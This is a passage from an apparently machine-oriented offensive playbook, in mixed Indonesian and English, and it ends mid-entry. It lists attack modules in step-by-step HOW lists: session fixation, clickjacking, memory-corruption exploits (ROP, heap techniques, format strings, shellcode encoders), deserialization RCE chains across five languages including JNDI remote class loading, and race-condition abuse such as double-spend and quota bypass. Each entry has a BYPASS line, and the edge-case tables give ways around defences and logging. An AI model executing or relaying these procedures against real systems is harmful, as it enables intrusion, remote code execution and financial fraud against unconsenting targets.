   BYPASS: Use alternate method

7. SESSION_FIXATION
   WHAT: Session fixation attack untuk unauthorized session access
   HOW:
   ├── Set predefined session identifier
   ├── Lure victim ke authenticate dengan fixed session ID
   ├── After authentication, hijack authenticated session
   ├── Test session ID regeneration after login
   └── Exploit session cookie attributes (HttpOnly, Secure)
   DETECTION: Session fixation anomaly detection
   BYPASS: Use alternate method

8. CLICKJACKING
   WHAT: Clickjacking (UI redressing) untuk unauthorized user actions
   HOW:
   ├── Create malicious page dengan invisible iframe
   ├── Overlay transparent target page
   ├── Trick user ke click invisible elements
   ├── Exploit missing X-Frame-Options header
   └── Test CSP frame-ancestors directive
   DETECTION: X-Frame-Options missing detection
   BYPASS: Use alternate method

9. TABNABBING
   WHAT: Reverse tabnabbing untuk session hijacking
   HOW:
   ├── Create page dengan target="_blank" links
   ├── Inject malicious JavaScript pada opener page
   ├── Redirect original tab ke phishing page
   ├── Exploit missing rel="noopener noreferrer"
   └── Hijack session setelah user authentication
   DETECTION: Tab navigation monitoring
   BYPASS: Use alternate method

10. PROTOTYPE_POLLUTION
    WHAT: JavaScript prototype pollution untuk client-side code execution
    HOW:
    ├── Identify prototype pollution gadgets trong JavaScript libraries
    ├── Inject malicious properties ke Object.prototype
    ├── Exploit pollution gadgets untuk XSS
    ├── Manipulate application state via polluted prototypes
    └── Test for server-side prototype pollution
    DETECTION: Prototype pollution detection tools
    BYPASS: Use alternate method

FALLBACK:
Host Header → SMS Smuggling → Email Injection →
Log Injection → Header Injection → Session Fixation →
Clickjacking → Tabnabbing → Prototype Pollution → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
Host header filtering active      │ 1. Try X-Forwarded-Host header
                                  │ 2. Use IP address directly
                                  │ 3. Bypass via reverse proxy
CSP blocks prototype pollution    │ 1. Identify alternative gadgets
                                  │ 2. Use DOM-based pollution
                                  │ 3. Target server-side pollution
Session fixation regeneration OK  │ 1. Switch to session fixation via subdomain
                                  │ 2. Attempt cookie injection
                                  │ 3. Use session fixation via XSS
Clickjacking frames blocked       │ 1. Try nested frames
                                  │ 2. Use alternative overlay technique
                                  │ 3. Switch to tabnabbing
Email injection sanitization      │ 1. Try different injection points
                                  │ 2. Use encoded CRLF sequences
                                  │ 3. Bypass via Unicode normalization
```

---
## 31. MODUL TAMBAHAN v3.1 (LAYER 61–70)

### 31.1 Memory Corruption

```
BUFFER_OVERFLOW (8):

1. STACK_OVERFLOW
   WHAT: Stack-based buffer overflow untuk overwrite return address
   HOW:
   ├── Cari input vector (form, cookie, header) yang di-copy ke stack buffer
   ├── Tentukan offset ke return address (pattern create + cyclic)
   ├── Overwrite return address dengan address shellcode atau gadget
   ├── Inject shellcode atau arahkan ke ROP chain
   └── Trigger overflow → control hijack → code execution
   DETECTION: Stack canary (SSP), ASLR monitoring, stack pivot detection
   BYPASS: Bypass stack canary via info leak atau use alternative method

2. HEAP_OVERFLOW
   WHAT: Heap-based buffer overflow untuk corrupt heap metadata
   HOW:
   ├── Identify heap-allocated buffer (malloc/calloc)
   ├── Overflow heap chunk header atau adjacent object
   ├── Corrupt fd/bk pointer untuk arbitrary write (unlink)
   ├── Control heap allocator → redirect allocation ke target address
   └── Trigger reallocation → overwrite target → code execution
   DETECTION: Heap integrity checks, metadata validation
   BYPASS: Use alternative heap exploitation technique

3. STACK_PIVOT
   WHAT: Stack pivot untuk memindahkan stack pointer ke controlled memory
   HOW:
   ├── Allocate RWX memory berisi ROP chain
   ├── Gunakan gadget (xchg rsp, rax / add rsp, ...) untuk pivot
   ├── Control RSP → point ke attacker-controlled stack
   ├── Execute ROP chain dari new stack
   └── Return ke shellcode atau system()
   DETECTION: Stack pivot detection, RSP monitoring
   BYPASS: Use alternative pivot gadget

4. RET2LIBC
   WHAT: Return ke libc function untuk bypass NX/DEP
   HOW:
   ├── Overwrite return address ke system() atau execve()
   ├── Set argument pointer ke "/bin/sh" atau controlled buffer
   ├── Handle ASLR dengan info leak atau brute-force
   ├── Align stack sesuai ABI requirement
   └── Trigger return → libc function executes
   DETECTION: libc function execution monitoring
   BYPASS: Use alternative libc function

5. RET2PLT
   WHAT: Return ke PLT untuk bypass ASLR (static addresses)
   HOW:
   ├── Overwrite GOT entry dengan target function address
   ├── Use format string atau other write primitive
   ├── Redirect PLT call ke attacker-controlled address
   ├── Chain ke main loop untuk stable exploit
   └── Trigger PLT call → redirected execution
   DETECTION: GOT integrity checks, PLT monitoring
   BYPASS: Use alternative GOT overwrite method

6. RET2WIN
   WHAT: Redirect ke pre-existing win function dalam binary
   HOW:
   ├── Cari "win" function atau gadget dalam binary
   ├── Overwrite return address ke win function
   ├── Set parameter sesuai win function requirement
   ├── Trigger overflow → return ke win function
   └── Win function executes → shell/flag
   DETECTION: Function call integrity, return address validation
   BYPASS: Use alternative win function

7. SROP
   WHAT: Sigreturn-oriented programming untuk full register control
   HOW:
   ├── Forge fake sigframe di stack atau controlled memory
   ├── Set semua registers dalam sigframe (RDI, RSI, RDX, etc.)
   ├── Trigger sigreturn syscall (syscall number 15)
   ├── Kernel restores registers dari sigframe
   └── Execute execve("/bin/sh") via restored registers
   DETECTION: Sigreturn syscall monitoring, register state validation
   BYPASS: Use alternative SROP chain

8. BLIND_OVERFLOW
   WHAT: Blind buffer overflow tanpa output atau error feedback
   HOW:
   ├── Identify overflow vulnerability tanpa visual feedback
   ├── Use time-based atau side-channel untuk confirm overflow
   ├── Brute-force return address atau canary (ASLR/SSP)
   ├── Implement retry loop dengan exponential backoff
   └── Trigger overflow → confirm via callback atau DNS
   DETECTION: Repeated connection attempts, timing anomalies
   BYPASS: Use alternative blind technique

HEAP_EXPLOIT (8):

1. HEAP_SPRAY
   WHAT: Heap spraying untuk mengisi heap dengan controlled data
   HOW:
   ├── Allocate banyak objects (JavaScript String, etc.)
   ├── Isi setiap object dengan NOP sled + shellcode
   ├── Trigger GC atau compact untuk posisi predictabel
   ├── Allocate target object di atas NOP sled
   └── Jump ke sprayed region → shellcode executes
   DETECTION: Excessive memory allocation patterns
   BYPASS: Use alternative spray target

2. UAF
   WHAT: Use-after-free exploit untuk reclaim freed memory
   HOW:
   ├── Allocate object → trigger free (browser GC, mem management)
   ├── Allocate new object di slot yang sama (reclaim)
   ├── Controlled data di new object overwrite freed object internals
   ├── Trigger use of freed object → dereference corrupted pointer
   └── Execute controlled function pointer atau virtual call
   DETECTION: Memory use-after-free monitoring
   BYPASS: Use alternative UAF target

3. DOUBLE_FREE
   WHAT: Double free exploit untuk corrupt tcache/fastbin
   HOW:
   ├── Allocate chunk A → free chunk A → free chunk A lagi
   ├── Tcache/fastbin sekarang punya pointer balik ke A
   ├── Allocate chunk B → reclaim slot A → controlled data
   ├── Free chunk B → corrupt tcache/fastbin metadata
   └── Allocate → return arbitrary address → arbitrary write
   DETECTION: Double free detection, tcache integrity checks
   BYPASS: Use alternative free list poisoning

4. HEAP_FENG_SHUI
   WHAT: Heap layout manipulation untuk predictabel exploitation
   HOW:
   ├── Allocate dan free objects dalam urutan tertentu
   ├── Manipulate hole/chunk layout di heap
   ├── Position target object di offset yang diketahui
   ├── Trigger vulnerability dengan layout yang predictabel
   └── Exploit dengan offset yang dikalkulasi
   DETECTION: Unusual heap allocation patterns
   BYPASS: Use alternative layout technique

5. UNLINK
   WHAT: Unlink abuse pada fastbin/tcache untuk arbitrary write
   HOW:
   ├── Allocate victim chunk → corrupt fd pointer
   ├── Free corrupted chunk ke tcache/fastbin
   ├── Alloc → return victim chunk → alloc lagi → reclaim slot
   ├── Victim chunk overwrite target address
   └── Trigger allocation → arbitrary write ke target
   DETECTION: Tcache/fastbin metadata integrity checks
   BYPASS: Use alternative unlink technique

6. POISON_NULL
   WHAT: Null byte poisoning untuk shift chunk boundaries
   HOW:
   ├── Allocate victim chunk A → free → reallocate sebagai B
   ├── Overflow B dengan null byte → corrupt A's size field
   ├── Size field shrinks → merge arena boundaries
   ├── Trigger consolidation → overlapping chunks
   └── Overlap depan belakang → arbitrary read/write
   DETECTION: Chunk size validation, arena consistency
   BYPASS: Use alternative poisoning technique

7. HOUSE_OF_FORCE
   WHAT: House of Force exploit untuk arbitrary malloc
   HOW:
   ├── Overwrite top chunk size dengan -1 (0xffffffffffffffff)
   ├── Calculate distance ke target address
   ├── Malloc dengan calculated size → top chunk pointer wrap
   ├── Next malloc return target address
   └── Write controlled data ke target address
   DETECTION: Top chunk size validation
   BYPASS: Use alternative top chunk manipulation

8. HOUSE_OF_ORANGE
   WHAT: House of Orange untuk bypass top chunk constraint
   HOW:
   ├── Corrupt top chunk size ke ukuran lebih kecil
   ├── Allocate sampai top chunk boundary
   ├── Old top chunk dikirim ke unsorted bin
   ├── Allocate dari unsorted bin → fake fd/bk
   └── Leak address → tcache poisoning → arbitrary write
   DETECTION: Top chunk size anomaly detection
   BYPASS: Use alternative orange technique

FORMAT_STRING (4):

1. FORMAT_READ
   WHAT: Format string vulnerability untuk memory leak
   HOW:
   ├── Identify format string input (%x, %p, %n)
   ├── Submit format string payload ke vulnerable function
   ├── Baca stack values dari format output (%x, %p)
   ├── Extract addresses (libc, stack, heap) dari output
   └── Use leaked addresses untuk bypass ASLR/PIE
   DETECTION: Format string input detection, unusual format specifiers
   BYPASS: Use alternative leak method

2. FORMAT_WRITE
   WHAT: Format string arbitrary write via %n specifier
   HOW:
   ├── Identify format string vulnerability
   ├── Craft payload dengan %n untuk tulis value ke address
   ├── Align address di stack dengan positional specifier (%7$n)
   ├── Control value yang ditulis (width specifier)
   └── Write ke target address → control overwrite
   DETECTION: Unusual %n usage, write-what-where primitive detection
   BYPASS: Use alternative write technique

3. FORMAT_OVERWRITE
   WHAT: GOT overwrite via format string vulnerability
   HOW:
   ├── Leak target address via format string read
   ├── Calculate offset ke GOT entry
   ├── Use %n untuk tulis ke GOT entry
   ├── Overwrite GOT function ke attacker-controlled address
   └── Trigger PLT call → redirected execution
   DETECTION: GOT integrity monitoring, format string on writable memory
   BYPASS: Use alternative GOT overwrite technique

4. FORMAT_PAYLOAD
   WHAT: Format string payload generator untuk automation
   HOW:
   ├── Analyze target binary (format string vulnerability type)
   ├── Generate leaker payload (%x, %p stack read)
   ├── Generate writer payload (%n aligned write)
   ├── Handle ASLR/PIE leak chain
   └── Combine leak + write dalam single payload
   DETECTION: Payload pattern matching, format string analysis
   BYPASS: Use manual format string technique

ROP_SHELLCODE (6):

1. ROP_CHAIN
   WHAT: Return-Oriented Programming chain construction
   HOW:
   ├── Scan binary/libs untuk useful gadgets (pop rdi; ret)
   ├── Chain gadgets untuk membangun功能desired function
   ├── Handle ASLR dengan info leak → resolve addresses
   ├── Align stack untuk ABI compliance
   └── Execute ROP chain → system("/bin/sh") atau execve
   DETECTION: ROP chain execution, return address anomaly
   BYPASS: Use alternative ROP chain

2. ROP_GADGET
   WHAT: Gadget finder menggunakan ROPgadget/ropper
   HOW:
   ├── Scan binary untuk instructions diakhiri dengan ret
   ├── Filter gadgets berdasarkan kebutuhan (pop, mov, xor)
   ├── Score gadgets berdasarkan usefulness
   ├── Export gadget addresses ke ROP chain builder
   └── Handle ASLR dengan random base resolution
   DETECTION: Unusual instruction sequences, gadget scanning detection
   BYPASS: Use alternative gadget source

3. RET2CSU
   WHAT: __libc_csu_init abuse untuk universal gadget
   HOW:
   ├── Locate __libc_csu_init dalam libc
   ├── Use pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
   ├── Call function dengan controlled arguments via rdi/rsi
   ├── Chain multiple csu gadgets untuk 3-argument calls
   └── Execute arbitrary function dengan 3 controlled args
   DETECTION: __libc_csu_init usage monitoring
   BYPASS: Use alternative universal gadget

4. RET2DL_RESOLVE
   WHAT: Dynamic linker abuse untuk resolve arbitrary function
   HOW:
   ├── Forge Elf_Sym dan Elf_Rela structs di writable memory
   ├── Control sym index → point ke attacker-controlled name
   ├── Trigger _dl_runtime_resolve → resolves fake symbol
   ├── Dynamic linker calls attacker-controlled function
   └── Execute arbitrary code via resolved function
   DETECTION: Unusual dynamic linker resolution, fake symbol detection
   BYPASS: Use alternative dl_resolve technique

5. SHELLCODE_INJECT
   WHAT: Shellcode injection via mmap atau execve
   HOW:
   ├── Allocate RWX memory (mmap atau VirtualAlloc)
   ├── Write shellcode ke allocated memory
   ├── Change memory protection ke RX
   ├── Create thread atau jump ke shellcode
   └── Shellcode executes → get shell atau execute payload
   DETECTION: RWX memory allocation, shellcode pattern detection
   BYPASS: Use alternative injection method

6. SHELLCODE_ENCODE
   WHAT: Encoder untuk bypass bad character filters
   HOW:
   ├── Identify bad characters di target input
   ├── Encode shellcode (alpha, unicode, xor) untuk menghindari bad chars
   ├── Generate decoder stub sesuai encoding
   ├── Prepend decoder ke encoded shellcode
   └── Decoder executes → decode shellcode → execute
   DETECTION: Shellcode encoding pattern, decoder stub detection
   BYPASS: Use alternative encoding technique

FALLBACK:
Stack Overflow → Heap Overflow → UAF → Double Free →
Format String → ROP Chain → Shellcode → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
ASLR terlalu kuat untuk brute     │ 1. Coba info leak terlebih dahulu
                                  │ 2. Gunakan partial overwrite
                                  │ 3. Fallback ke blind overflow
Canary detect payload             │ 1. Bypass via info leak canary
                                  │ 2. Gunakan alternative write primitive
                                  │ 3. Fallback ke heap exploitation
NX/DEP menghalangi shellcode     │ 1. Gunakan ROP chain
                                  │ 2. Gunakan ret2libc/ret2plt
                                  │ 3. Gunakan mmap executable region
Heap allocation predictabel       │ 1. Gunakan heap feng shui
                                  │ 2. Brute-force allocation order
                                  │ 3. Fallback ke different heap technique
Target binary stripped/tinied     │ 1. Gunakan ret2csu universal gadget
                                  │ 2. Gunakan ret2dl_resolve
                                  │ 3. Gunakan blind ROP technique
```

---

### 31.2 Deserialization Attacks

```
JAVA_DESERTOP (6):

1. YSOSERIAL
   WHAT: ysoserial gadget chain exploit (CommonsCollections, Spring, etc.)
   HOW:
   ├── Pilih gadget chain sesuai target library (CommonsCollections, Spring, etc.)
   ├── Generate serialized object dengan ysoserial tool
   ├── Inject serialized object ke target input (HTTP param, JMS, RMI)
   ├── Target deserialize object → gadget chain executes
   └── Chain execute arbitrary command via Runtime.exec()
   DETECTION: Deserialization filter, gadget chain signature detection
   BYPASS: Use alternative gadget chain

2. JNDI_INJECT
   WHAT: JNDI injection (Log4Shell style) untuk remote class loading
   HOW:
   ├── Deploy malicious LDAP/RMI server dengan class payload
   ├── Inject JNDI lookup string ke vulnerable input
   ├── Target resolves JNDI → connects ke attacker server
   ├── Malicious class loaded dan instantiated
   └── Static initializer executes arbitrary code
   DETECTION: JNDI lookup detection, outbound LDAP/RMI connection monitoring
   BYPASS: Use alternative JNDI vector

3. CLASSLOADER
   WHAT: ClassLoader manipulation untuk load arbitrary classes
   HOW:
   ├── Identify ClassLoader vulnerability (URLClassloader, etc.)
   ├── Craft serialized object yang manipulate ClassLoader state
   ├── Inject ke deserialization endpoint
   ├── ClassLoader resolves ke attacker-controlled classpath
   └── Malicious class loaded dan executed
   DETECTION: ClassLoader state change monitoring, unexpected class loading
   BYPASS: Use alternative ClassLoader technique

4. DNS_EXFIL
   WHAT: DNS exfiltration via deserialization endpoint
   HOW:
   ├── Generate serialized object yang trigger DNS query
   ├── Inject ke deserialization endpoint
   ├── Target deserialize → trigger DNS resolution
   ├── DNS query contains exfiltrated data (subdomain encoding)
   └── Capture DNS query → extract data
   DETECTION: Unusual DNS query patterns, deserialization endpoint monitoring
   BYPASS: Use alternative exfiltration vector

5. LDAP_INJECT
   WHAT: LDAP injection via JNDI untuk RCE
   HOW:
   ├── Deploy malicious LDAP server dengan serialized payload
   ├── Inject JNDI LDAP lookup ke vulnerable application
   ├── Target resolve JNDI LDAP → fetch malicious entry
   ├── Deserialized object trigger code execution
   └── Arbitrary command execution via gadget chain
   DETECTION: LDAP query monitoring, deserialization endpoint protection
   BYPASS: Use alternative LDAP vector

6. RMI_EXPLOIT
   WHAT: RMI remote class loading exploit
   HOW:
   ├── Deploy malicious RMI registry
   ├── Register remote object dengan malicious class
   ├── Target connects ke attacker RMI registry
   ├── Remote class loaded via RMI class loading
   └── Class initializer executes arbitrary code
   DETECTION: RMI connection monitoring, remote class loading detection
   BYPASS: Use alternative RMI technique

PYTHON_DESER (5):

1. PICKLE_RCE
   WHAT: Pickle deserialization RCE via __reduce__ method
   HOW:
   ├── Craft malicious pickle payload dengan __reduce__
   ├── __reduce__ returns (os.system, ("command",))
   ├── Send pickle payload ke vulnerable endpoint
   ├── Target unpickle → __reduce__ executed
   └── Arbitrary command execution via os.system
   DETECTION: Pickle deserialization monitoring, __reduce__ detection
   BYPASS: Use alternative pickle gadget

2. YAML_LOAD
   WHAT: PyYAML unsafe_load RCE via !!python/object
   HOW:
   ├── Craft YAML payload dengan !!python/object/apply:os.system
   ├── Inject payload ke YAML parsing endpoint
   ├── Target yaml.unsafe_load → python object instantiated
   ├── Object constructor executes arbitrary code
   └── Command execution via yaml deserialization
   DETECTION: Unsafe YAML loading, !!python tag detection
   BYPASS: Use alternative YAML payload

3. MARSHAL_LOAD
   WHAT: Marshal deserialization RCE untuk Python objects
   HOW:
   ├── Craft malicious marshal payload dengan code object
   ├── Code object contains malicious bytecode
   ├── Send marshal payload ke vulnerable endpoint
   ├── Target marshal.loads → code object deserialized
   └── Malicious bytecode executes arbitrary code
   DETECTION: Marshal loading monitoring, code object detection
   BYPASS: Use alternative marshal technique

4. SHELF_EXPLOIT
   WHAT: Shelve deserialization abuse untuk arbitrary code execution
   HOW:
   ├── Identify shelve serialization endpoint
   ├── Craft malicious shelve database entry
   ├── Inject payload ke shelve storage
   ├── Target shelve.load → deserialized object executes
   └── Arbitrary code execution via shelve deserialization
   DETECTION: Shelve deserialization monitoring
   BYPASS: Use alternative shelve technique

5. JSONPICKLE
   WHAT: jsonpickle remote code execution via object deserialization
   HOW:
   ├── Craft jsonpickle payload dengan malicious class reference
   ├── Inject payload ke jsonpickle deserialization endpoint
   ├── Target jsonpickle.loads → object instantiated
   ├── Malicious class constructor or __init__ executes
   └── Arbitrary code execution via jsonpickle
   DETECTION: jsonpickle usage monitoring, class instantiation detection
   BYPASS: Use alternative jsonpickle vector

PHP_DESER (5):

1. UNSERIALIZE_RCE
   WHAT: PHP unserialize() exploit untuk RCE
   HOW:
   ├── Identify unserialize() dengan user-controlled input
   ├── Craft serialized payload dengan malicious object
   ├── Object utilizes magic methods (__wakeup, __destruct)
   ├── Trigger deserialize → magic method executes
   └── Arbitrary code execution via magic method chain
   DETECTION: Unserialize function monitoring, magic method detection
   BYPASS: Use alternative unserialize gadget

2. PHAR_INJECTION
   WHAT: Phar deserialization exploit via phar:// protocol
   HOW:
   ├── Upload malicious phar archive ke server
   ├── Trigger file operation dengan phar:// stream wrapper
   ├── Target triggers phar metadata deserialization
   ├── Deserialized object execute magic methods
   └── RCE via phar deserialization chain
   DETECTION: Phar stream wrapper usage, metadata deserialization detection
   BYPASS: Use alternative phar technique

3. MAGIC_METHOD
   WHAT: __wakeup/__destruct abuse dalam PHP deserialization
   HOW:
   ├── Identify classes dengan dangerous magic methods
   ├── Chain magic methods untuk code execution
   ├── Craft serialized object yang trigger method chain
   ├── __wakeup() → __destruct() → system()
   └── RCE via magic method execution chain
   DETECTION: Magic method execution monitoring, method chain detection
   BYPASS: Use alternative magic method vector

4. POP_CHAIN
   WHAT: POP (Property Oriented Programming) chain exploit
   HOW:
   ├── Identify POP gadget classes dalam application
   ├── Chain gadgets menggunakan property access
   ├── Trigger deserialization → property chain executes
   ├── Property getters/setters manipulasi object state
   └── RCE via POP gadget chain execution
   DETECTION: POP chain signature detection, property access monitoring
   BYPASS: Use alternative POP chain

5. LARAVEL_RCE
   WHAT: Laravel deserialization RCE exploit
   HOW:
   ├── Identify Laravel deserialization endpoint
   ├── Craft Laravel-specific gadget chain (Illuminate, Monolog)
   ├── Inject serialized payload ke vulnerable endpoint
   ├── Target deserializes → gadget chain executes
   └── RCE via Laravel framework deserialization
   DETECTION: Laravel deserialization monitoring, gadget chain detection
   BYPASS: Use alternative Laravel gadget

DOTNET_DESER (5):

1. BINARYFORMATTER
   WHAT: BinaryFormatter deserialization exploit untuk RCE
   HOW:
   ├── Craft malicious BinaryFormatter payload dengan TypeConfuseDelegate gadget
   ├── Inject payload ke deserialization endpoint
   ├── Target BinaryFormatter.Deserialize() → gadget executes
   ├── TypeConverter chain triggers code execution
   └── Arbitrary code execution via .NET deserialization
   DETECTION: BinaryFormatter usage monitoring, gadget signature detection
   BYPASS: Use alternative .NET gadget

2. JAVASCRIPTSER
   WHAT: JavaScriptSerializer exploit untuk RCE
   HOW:
   ├── Craft payload dengan JavaScriptConverter exploit
   ├── Inject payload ke JavaScriptSerializer.Deserialize()
   ├── Target deserialize → converter instantiates object
   ├── Malicious constructor executes arbitrary code
   └── RCE via JavaScriptSerializer chain
   DETECTION: JavaScriptSerializer deserialization monitoring
   BYPASS: Use alternative JavaScriptSerializer vector

3. JSON_NET
   WHAT: Newtonsoft Json.NET Exploit untuk RCE
   HOW:
   ├── Craft payload dengan TypeNameHandling.All enabled
   ├── Inject payload ke Json.NET deserialization
   ├── Target deserialize → type resolution executes
   ├── Arbitrary type instantiated with controlled constructor
   └── RCE via Json.NET type confusion
   DETECTION: Json.NET TypeNameHandling monitoring
   BYPASS: Use alternative Json.NET vector

4. TYPECONFUSION
   WHAT: Type confusion deserialization exploit
   HOW:
   ├── Identify type confusion vulnerability in deserializer
   ├── Craft payload yang exploit type confusion
   ├── Inject payload ke deserialization endpoint
   ├── Target deserializes → incorrect type cast
   └── Memory corruption atau arbitrary code execution
   DETECTION: Type confusion monitoring, type safety validation
   BYPASS: Use alternative type confusion technique

5. GADGETS_NET
   WHAT: .NET gadget chains (ysoserial.net) untuk deserialization
   HOW:
   ├── Pilih .NET gadget chain dari ysoserial.net
   ├── Generate serialized payload dengan selected chain
   ├── Inject payload ke vulnerable endpoint
   ├── Target deserializes → gadget chain executes
   └── RCE via .NET gadget chain execution
   DETECTION: .NET gadget chain signature detection
   BYPASS: Use alternative .NET gadget chain

RUBY_DESER (3):

1. MARSHAL_LOAD
   WHAT: Marshal.load RCE exploit
   HOW:
   ├── Craft malicious Ruby Marshal payload dengan _load method
   ├── Inject payload ke Marshal.load() endpoint
   ├── Target deserialize → _load method executed
   ├── Arbitrary object instantiation dengan malicious attributes
   └── RCE via Marshal deserialization
   DETECTION: Marshal.load usage monitoring, _load method detection
   BYPASS: Use alternative Marshal technique

2. YAML_LOAD
   WHAT: YAML.load RCE exploit
   HOW:
   ├── Craft YAML payload dengan !!ruby/object tag
   ├── Inject payload ke YAML.load() endpoint
   ├── Target deserialize → Ruby object instantiated
   ├── Object constructor or initialize method executes
   └── RCE via YAML deserialization
   DETECTION: YAML.load monitoring, !!ruby tag detection
   BYPASS: Use alternative YAML technique

3. GEM_RCE
   WHAT: Gem installation backdoor exploit
   HOW:
   ├── Craft malicious gem dengan installer exploit
   ├── Backdoor gemspec dengan pre/post install hooks
   ├── Target installs gem → installer executes
   ├── Malicious hooks execute arbitrary code
   └── Persistent backdoor via gem installation
   DETECTION: Gem installation monitoring, installer hook detection
   BYPASS: Use alternative gem vector

FALLBACK:
Java Gadget → JNDI → Pickle → YAML → PHP Unserialize →
Phar → .NET BinaryFormatter → Ruby Marshal → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
Target uses safe deserialization   │ 1. Try harder-to-detect gadget chains
                                  │ 2. Use partial deserialization gadgets
                                  │ 3. Fallback ke alternative vector
No vulnerable library version     │ 1. Enumerate all available libraries
                                  │ 2. Try library-specific chains
                                  │ 3. Fallback ke different attack vector
Input validation blocks payloads  │ 1. Bypass dengan encoding/obfuscation
                                  │ 2. Use alternative input vector
                                  │ 3. Fallback ke manual exploitation
Deserialization exception logged  │ 1. Use stealthier payload
                                  │ 2. Retry dengan exponential backoff
                                  │ 3. Fallback ke out-of-band technique
Multiple deserialization layers   │ 1. Chain multiple gadgets
                                  │ 2. Use nested deserialization
                                  │ 3. Fallback ke direct injection
```

---

### 31.3 Race Conditions

```
TOCTOU (5):

1. FILE_RACE
   WHAT: File creation/deletion race condition exploit
   HOW:
   ├── Identify file operations dengan check-then-use pattern
   ├── Monitor target file status (exists/permission)
   ├── Trigger file deletion di antara check dan use
   ├── Victim application beroperasi dengan file yang sudah berubah
   └── Exploit perbedaan state → privilege escalation atau RCE
   DETECTION: File operation timing analysis, TOCTOU pattern detection
   BYPASS: Use alternative file race technique

2. SYMLINK_RACE
   WHAT: Symlink race condition untuk arbitrary file access
   HOW:
   ├── Cari file operations yang menggunakan symlink
   ├── Buat symlink ke target sensitive file
   ├── Trigger application membuka symlink
   ├── Di antara open dan read, swap symlink ke target lain
   └── Application membaca file berbeda → arbitrary file access
   DETECTION: Symlink creation monitoring, file descriptor race detection
   BYPASS: Use alternative symlink vector

3. TEMP_FILE_RACE
   WHAT: Temporary file race condition exploit
   HOW:
   ├── Identify temporary file creation (mktemp, tmpfile)
   ├── Race untuk create symlink sebelum application
   ├── Target application membuka temp file
   ├── Symlink sudah point ke sensitive location
   └── Read/write ke sensitive file via temp file handle
   DETECTION: Temp file creation monitoring, symlink detection
   BYPASS: Use alternative temp file technique

4. LOCK_BYPASS
   WHAT: Lock bypass via race condition
   HOW:
   ├── Identify file locking mechanism (flock, fcntl)
   ├── Trigger lock acquisition race condition
   ├── Obtain lock sebelum legitimate holder
   ├── Access resource di bawah false lock
   └── Bypass lock protection → unauthorized access
   DETECTION: Lock acquisition anomaly, concurrent lock access
   BYPASS: Use alternative lock bypass technique

5. AUTH_RACE
   WHAT: Authentication bypass via race condition
   HOW:
   ├── Identify authentication check-then-use pattern
   ├── Trigger concurrent authentication requests
   ├── Race untuk bypass check sebelum complete
   ├── Obtain authenticated state tanpa valid credential
   └── Access protected resource via race-bypassed auth
   DETECTION: Concurrent auth attempt detection, timing anomaly
   BYPASS: Use alternative authentication bypass

CONCURRENT_ABUSE (6):

1. DOUBLE_SPEND
   WHAT: Double-spend attack (payment) via concurrent requests
   HOW:
   ├── Identify payment processing endpoint
   ├── Submit multiple concurrent payment requests
   ├── Race condition memungkinkan same balance double-use
   ├── Each request passes balance check sebelum prev committed
   └── Same funds spent multiple times → financial loss
   DETECTION: Concurrent transaction detection, balance integrity check
   BYPASS: Use alternative payment race technique

2. DOUBLE_SUBMIT
   WHAT: Double-submit (coupon, referral) abuse
   HOW:
   ├── Identify coupon/referral submission endpoint
   ├── Submit same coupon/referral code concurrently
   ├── Race condition memungkinkan same code used twice
   ├── Each request passes validation sebelum prev committed
   └── Same benefit claimed multiple times → abuse
   DETECTION: Duplicate submission detection, concurrent usage monitoring
   BYPASS: Use alternative double-submit technique

3. CONCURRENT_REQUEST
   WHAT: Concurrent API request abuse untuk parallel exploitation
   HOW:
   ├── Identify API endpoints dengan race condition vulnerability
   ├── Send multiple concurrent requests ke same endpoint
   ├── Race condition memungkinkan parallel state modification
   ├── Each request modifies state tanpa proper locking
   └── Unauthorized parallel operations → data corruption atau escalation
   DETECTION: API rate limiting, concurrent request pattern detection
   BYPASS: Use alternative concurrent technique

4. TOKEN_REUSE
   WHAT: Token reuse during race condition exploit
   HOW:
   ├── Identify token validation dengan race window
   ├── Submit same token concurrently ke multiple endpoints
   ├── Race condition memungkinkan token digunakan sebelum invalidated
   ├── Each request passes token check sebelum invalidation committed
   └── Single token digunakan multiple times → privilege abuse
   DETECTION: Token reuse detection, concurrent token validation
   BYPASS: Use alternative token race technique

5. IDOR_RACE
   WHAT: IDOR via race condition exploit
   HOW:
   ├── Identify resource access endpoint dengan IDOR
   ├── Monitor target resource ID
   ├── Race untuk mengubah resource ownership/permission
   ├── Access IDOR-vulnerable endpoint sebelum permission change committed
   └── Access resource berbeda via race-bypassed authorization
   DETECTION: IDOR access monitoring, concurrent permission change detection
   BYPASS: Use alternative IDOR race technique

6. QUOTA_BYPASS
   WHAT: Quota/rate-limit bypass via race condition
   HOW:
   ├── Identify quota/rate-limit enforcement mechanism
   ├── Submit concurrent requests sebelum counter incremented
   ├── Race condition memungkinkan request dilayani sebelum limit checked
   ├── Each request passes quota check sebelum prev counted
   └── Exceed rate limit → quota bypass achieved
   DETECTION: Rate limit counter anomaly, concurrent quota check detection
   BYPASS: Use alternative quota bypass technique

STATE_RACE (5):

1. STATE_CONFUSION
   WHAT: State machine confusion via race condition
   HOW:
   ├── Identify state machine dengan transient states
   ├── Trigger concurrent state transitions
   ├── Race condition memungkinkan invalid state combinations
   ├── State machine enters inconsistent state
   └── Exploit inconsistent state → privilege escalation atau bypass
   DETECTION: State transition anomaly, invalid state detection
   BYPASS: Use alternative state confusion technique

2. QUEUE_JUMP
   WHAT: Queue jumping via race condition exploit
   HOW:
   ├── Identify queue management system
   ├── Submit high-priority request saat queue processing
   ├── Race condition memungkinkan queue position manipulation
   ├── Request inserted di posisi lebih tinggi
   └── Bypass normal queue order → priority abuse
   DETECTION: Queue position monitoring, insert anomaly detection
   BYPASS: Use alternative queue manipulation technique

3. PRIORITY_ESCAL
   WHAT: Priority escalation via race condition
   HOW:
   ├── Identify priority assignment mechanism
   ├── Submit priority change request concurrent dengan normal operation
   ├── Race condition memungkinkan priority di-change sebelum evaluated
   ├── Higher priority granted tanpa legitimate justification
   └── Obtain elevated priority → resource access atau scheduling abuse
   DETECTION: Priority change monitoring, concurrent escalation detection
   BYPASS: Use alternative priority escalation technique

4. ORDER_MANIPULATE
   WHAT: Order manipulation (trading, bidding) via race condition
   HOW:
   ├── Identify trading/bidding system dengan race window
   ├── Submit concurrent orders dengan price manipulation
   ├── Race condition memungkinkan same funds used multiple times
